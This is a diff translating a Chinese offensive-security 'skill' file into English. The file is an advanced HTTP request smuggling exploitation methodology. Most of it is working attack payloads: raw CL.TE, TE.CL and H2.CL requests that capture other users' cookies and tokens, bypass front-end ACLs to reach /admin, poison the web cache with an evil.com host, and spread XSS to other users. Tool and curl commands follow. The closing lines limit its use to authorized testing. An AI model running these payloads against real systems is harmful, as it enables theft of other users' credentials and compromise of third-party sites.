@@ -1,40 +1,44 @@
 ---
 name: http-smuggling-advanced
-description: "HTTP 请求走私高级利用方法论。扩展 cache-poisoning-smuggling 的走私部分。当已确认存在 CL.TE/TE.CL/TE.TE/H2.CL 走私时使用。覆盖链式利用（窃取凭据、绕过 ACL、投毒 Web 缓存、XSS 其他用户）和 HTTP/2 降级走私"
+description: "Advanced HTTP request smuggling exploitation methodology. Extends the smuggling portion of cache-poisoning-smuggling. Use when CL.TE/TE.CL/TE.TE/H2.CL smuggling has already been confirmed. Covers chained exploitation (stealing credentials, bypassing ACLs, poisoning the web cache, XSS against other users) and HTTP/2 downgrade smuggling"
+zh-signals: "在已确认 HTTP 请求走私后，覆盖链式利用（窃取凭据、绕过 ACL、缓存投毒）与 HTTP/2 降级走私的高级方法论。信号:请求走私,CL.TE,TE.CL,H2降级,链式利用"
+when-to-use: >-
+  Use when request smuggling (CL.TE/TE.CL/TE.TE/H2.CL/H2.TE) is already confirmed and you need
+  advanced chained exploitation or HTTP/2 downgrade techniques.
 metadata:
-  tags: "http smuggling,request smuggling,desync,cl-te,te-cl,h2-smuggling,http2,降级走私,请求走私"
+  tags: "http smuggling,request smuggling,desync,cl-te,te-cl,h2-smuggling,http2,downgrade smuggling,request smuggling"
   category: "exploit"
   mitre_attack: "T1190,T1557"
 ---
 
-# HTTP 请求走私高级利用
+# Advanced HTTP Request Smuggling Exploitation
 
-> **前置**: 本 skill 专注于**确认走私漏洞后的链式利用**
+> **Prerequisite**: This skill focuses on **chained exploitation after the smuggling vulnerability is confirmed**
 
-## ⛔ 深入参考
+## ⛔ Further Reading
 
-- 各类走私变体检测 payload → [references/smuggling-detection.md](references/smuggling-detection.md)
-- H2C/H2 降级走私技术 → [references/h2-smuggling.md](references/h2-smuggling.md)
+- Detection payloads for each smuggling variant → [references/smuggling-detection.md](references/smuggling-detection.md)
+- H2C/H2 downgrade smuggling techniques → [references/h2-smuggling.md](references/h2-smuggling.md)
 
 ---
 
-## Phase 0: 走私类型速查
+## Phase 0: Smuggling Type Quick Reference
 
 ```
-前端(FE) 用什么解析请求长度？后端(BE) 用什么？
+What does the front end (FE) use to parse the request length? What does the back end (BE) use?
 
-CL.TE: FE 用 Content-Length → BE 用 Transfer-Encoding
-TE.CL: FE 用 Transfer-Encoding → BE 用 Content-Length
-TE.TE: 两者都用 TE，但对畸形 TE 头处理不一致
-H2.CL: FE 用 HTTP/2 帧长度 → BE 降级到 HTTP/1.1 用 CL
-H2.TE: FE 用 HTTP/2 → BE 降级后用 TE
+CL.TE: FE uses Content-Length → BE uses Transfer-Encoding
+TE.CL: FE uses Transfer-Encoding → BE uses Content-Length
+TE.TE: both use TE, but they handle malformed TE headers differently
+H2.CL: FE uses HTTP/2 frame length → BE downgrades to HTTP/1.1 and uses CL
+H2.TE: FE uses HTTP/2 → BE downgrades and uses TE
 
-⛔ 确认走私存在后才进入本 skill 的利用阶段
+⛔ Only enter this skill's exploitation phase after smuggling has been confirmed
 ```
 
-## Phase 1: CL.TE 走私利用
+## Phase 1: CL.TE Smuggling Exploitation
 
-### 1.1 窃取其他用户请求
+### 1.1 Stealing Other Users' Requests
 
 ```http
 POST / HTTP/1.1
@@ -52,9 +56,9 @@ Content-Type: application/x-www-form-urlencoded
 stolen=
 ```
 
-**原理：** 后端将 `POST /log ... stolen=` 当作下一个请求的前缀 → 下一个用户的完整请求被拼接到 `stolen=` 后面 → 你可以读取他们的 Cookie/Token
+**Principle:** The back end treats `POST /log ... stolen=` as the prefix of the next request → the next user's complete request is appended after `stolen=` → you can read their cookies/tokens
 
-### 1.2 绕过前端 ACL
+### 1.2 Bypassing Front-End ACLs
 
 ```http
 POST / HTTP/1.1
@@ -70,9 +74,9 @@ X-Forwarded-For: 127.0.0.1
 
 ```
 
-**原理：** 前端只检查第一个请求（POST /）→ 放行。被走私的 `GET /admin` 直接到达后端 → 绕过前端的 IP/路径限制。
+**Principle:** The front end only checks the first request (POST /) → it lets it through. The smuggled `GET /admin` reaches the back end directly → bypassing the front end's IP/path restrictions.
 
-### 1.3 投毒 Web 缓存
+### 1.3 Poisoning the Web Cache
 
 ```http
 POST / HTTP/1.1
@@ -88,9 +92,9 @@ X-Forwarded-Host: evil.com
 
 ```
 
-**原理：** 走私的 GET 请求 + 恶意 Host 头 → 后端返回包含 `evil.com` 的响应 → 前端缓存此响应 → 其他用户访问 `/static/main.js` 获取到被投毒的内容。
+**Principle:** The smuggled GET request + malicious Host header → the back end returns a response containing `evil.com` → the front end caches this response → other users fetching `/static/main.js` receive the poisoned content.
 
-### 1.4 反射 XSS 升级为存储 XSS
+### 1.4 Escalating Reflected XSS to Stored XSS
 
 ```http
 POST / HTTP/1.1
@@ -105,9 +109,9 @@ Host: target.com
 X-Random: x
 ```
 
-**原理：** 如果 `/search` 有反射 XSS → 走私请求让下一个用户的响应变成包含 XSS payload 的搜索结果页 → 反射变存储。
+**Principle:** If `/search` has reflected XSS → the smuggled request turns the next user's response into a search result page containing the XSS payload → reflected becomes stored.
 
-## Phase 2: TE.CL 走私利用
+## Phase 2: TE.CL Smuggling Exploitation
 
 ```http
 POST / HTTP/1.1
@@ -126,20 +130,20 @@ x=1
 
 ```
 
-**关键：** 前端根据 TE 正确读取全部 chunked 数据。后端根据 CL=4 只读 `78\r\n`，剩余的 `POST /admin ...` 被当作独立新请求。
+**Key:** The front end correctly reads all chunked data based on TE. The back end only reads `78\r\n` based on CL=4, and the remaining `POST /admin ...` is treated as a separate new request.
 
-## Phase 3: HTTP/2 降级走私 (H2.CL / H2.TE)
+## Phase 3: HTTP/2 Downgrade Smuggling (H2.CL / H2.TE)
 
-### 3.1 H2.CL 走私
+### 3.1 H2.CL Smuggling
 
 ```
-HTTP/2 请求（前端）：
+HTTP/2 request (front end):
 :method: POST
 :path: /
 :authority: target.com
 content-length: 0
 
-走私的 HTTP/1.1（后端看到的）：
+Smuggled HTTP/1.1 (what the back end sees):
 POST / HTTP/1.1\r\n
 Host: target.com\r\n
 Content-Length: 0\r\n
@@ -149,65 +153,64 @@ Host: target.com\r\n
 \r\n
 ```
 
-**原理：** HTTP/2 用帧长度，不需要 CL。但降级到 HTTP/1.1 时，错误的 CL 值使后端将多余数据当作新请求。
+**Principle:** HTTP/2 uses frame lengths and does not need CL. But when downgrading to HTTP/1.1, the wrong CL value makes the back end treat the extra data as a new request.
 
 ### 3.2 H2 Request Tunneling
 
 ```
-利用 HTTP/2 HEADERS 帧的特殊头：
+Exploiting special headers in HTTP/2 HEADERS frames:
 :method: POST
 :path: /
 :authority: target.com
 transfer-encoding: chunked
 
-在 HTTP/2 中 TE 头通常被忽略，但降级后生效
-→ 可构造 CL 与 TE 不一致的情况
+The TE header is usually ignored in HTTP/2, but it takes effect after the downgrade
+→ this lets you construct a CL/TE mismatch
 ```
 
-## Phase 4: 自动化检测与利用
+## Phase 4: Automated Detection and Exploitation
 
-### 工具
+### Tools
 
 ```bash
-# smuggler.py — 自动化检测
+# smuggler.py — automated detection
 python3 smuggler.py -u https://target.com
 
-# Burp Suite — HTTP Request Smuggler 扩展
-# 安装扩展 → Scan → 报告走私类型
+# Burp Suite — HTTP Request Smuggler extension
+# Install the extension → Scan → reports the smuggling type
 
-# h2csmuggler — HTTP/2 明文升级走私
+# h2csmuggler — HTTP/2 cleartext upgrade smuggling
 python3 h2csmuggler.py -x https://target.com -t /admin
 
-# 手动 curl 验证（CL.TE）
+# Manual curl verification (CL.TE)
 curl -i -X POST https://target.com/ \
   -H "Content-Length: 6" \
   -H "Transfer-Encoding: chunked" \
   --data-binary $'0\r\n\r\nG'
-# 如果第二次正常 GET 返回 "GGET / HTTP/1.1 ..." 405 → 存在走私
+# If the second normal GET returns "GGET / HTTP/1.1 ..." 405 → smuggling exists
 ```
 
-### 验证走私成功的方法
+### How to Verify Successful Smuggling
 
 ```
-方法 1: 时间差异
-├─ 走私一个有延迟的请求 → 观察响应时间变化
+Method 1: Timing difference
+├─ Smuggle a request with a delay → observe the response time change
 
-方法 2: 差异响应
-├─ 走私 GET /404path → 下一个正常请求返回 404
+Method 2: Differential response
+├─ Smuggle GET /404path → the next normal request returns 404
 
-方法 3: 反射请求
-├─ 走私请求到自己控制的日志服务器
-├─ 观察是否收到其他用户的请求
+Method 3: Reflected request
+├─ Smuggle a request to your own logging server
+├─ Observe whether other users' requests are received
 
-方法 4: OAST（Out-of-band）
-├─ 走私 Host: burp-collaborator.net
-├─ 检查 Collaborator 收到的 DNS/HTTP 请求
+Method 4: OAST (Out-of-band)
+├─ Smuggle with Host: burp-collaborator.net
+├─ Check the DNS/HTTP requests received by Collaborator
 ```
 
-## ⛔ 风险控制
+## ⛔ Risk Control
 
-- 请求走私**会影响其他用户** → 仅在授权测试中使用
-- 测试时使用唯一标识符区分你的请求
-- 先用时间差异法确认 → 再进行利用
-- 避免大量走私请求导致服务不可用
-
+- Request smuggling **affects other users** → use it only in authorized testing
+- Use unique identifiers to distinguish your requests during testing
+- Confirm with the timing difference method first → then proceed with exploitation
+- Avoid sending large numbers of smuggled requests, which could make the service unavailable
